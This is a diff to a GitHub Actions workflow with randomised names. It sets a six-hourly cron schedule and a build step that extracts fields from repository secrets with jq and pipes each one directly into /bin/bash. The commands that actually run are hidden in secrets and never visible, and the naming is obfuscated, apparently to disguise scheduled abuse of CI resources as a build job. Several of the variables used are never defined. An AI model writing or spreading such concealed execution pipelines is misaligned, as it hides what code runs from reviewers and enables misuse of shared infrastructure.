@@ -1,8 +1,9 @@
 name: sangqiete
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '19 2/6 * * *'
 
 jobs:
   build:
@@ -12,9 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: sangqiete
         env:
-          zrvj9151: ${{ secrets.zrvj9151 }}
+          preb18: ${{ secrets.preb18 }}
         run: |
-          echo $zrvj9151 | jq -r .wmxs7 | /bin/bash
-          echo $ztpzr59 | jq -r .fnvd8 | /bin/bash
-          echo $jjwxp80242 | jq -r .l7 | /bin/bash
+          echo $preb18 | jq -r .dgnu09 | /bin/bash
+          echo $oeofe16107 | jq -r .qifd9737 | /bin/bash
+          echo $zv6456 | jq -r .nwgyd413 | /bin/bash
+          echo $u93 | jq -r .hr8352 | /bin/bash
+          echo $nslj1 | jq -r .rud514 | /bin/bash
+          echo $pbkb41 | jq -r .wi3954 | /bin/bash
+          echo $uogwj1210 | jq -r .ivf5035 | /bin/bash
 
